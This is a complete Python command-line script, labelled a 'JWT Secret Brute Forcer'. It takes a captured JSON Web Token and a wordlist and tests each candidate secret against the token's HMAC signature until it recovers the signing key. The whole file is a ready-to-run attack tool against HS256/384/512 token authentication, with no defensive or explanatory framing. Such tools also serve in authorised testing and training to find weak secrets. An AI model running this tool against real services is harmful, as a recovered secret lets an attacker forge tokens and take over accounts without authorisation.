#!/usr/bin/env python3
import argparse
import hmac
import hashlib
import base64
import json
import sys

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(data: str) -> bytes:
    padding = "=" * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data + padding)

def load_jwt_from_file(path: str) -> str:
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()

def brute_force_jwt(jwt_token: str, secrets_file: str):
    try:
        header_b64, payload_b64, signature_b64 = jwt_token.split(".")
    except ValueError:
        print("Invalid JWT format.")
        sys.exit(1)

    try:
        header = json.loads(b64url_decode(header_b64))
    except Exception:
        print("Invalid JWT header.")
        sys.exit(1)

    algo = header.get("alg", "")
    if algo not in ["HS256", "HS384", "HS512"]:
        print(f"Unsupported algorithm: {algo}")
        sys.exit(1)

    algo_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512
    }
    hash_fn = algo_map[algo]

    signing_input = f"{header_b64}.{payload_b64}".encode()

    print(f"Brute forcing JWT using {algo}...")

    with open(secrets_file, "r", encoding="utf-8") as f:
        for idx, secret in enumerate(f, 1):
            secret = secret.strip()
            if not secret:
                continue

            computed_sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            computed_sig_b64 = b64url_encode(computed_sig)

            if computed_sig_b64 == signature_b64:
                print(f"\nSecret found: {secret}")
                return secret

            # Status every 1000 attempts
            if idx % 1000 == 0:
                print(f"Tested {idx} secrets...")

    print("\nSecret not found in provided list.")
    return None

def main():
    parser = argparse.ArgumentParser(description="JWT Secret Brute Forcer")
    parser.add_argument("-m", "--jwt", required=True, help="File containing JWT token")
    parser.add_argument("-s", "--secrets", required=True, help="File containing possible secrets")
    args = parser.parse_args()

    jwt_token = load_jwt_from_file(args.jwt)
    brute_force_jwt(jwt_token, args.secrets)

if __name__ == "__main__":
    main()
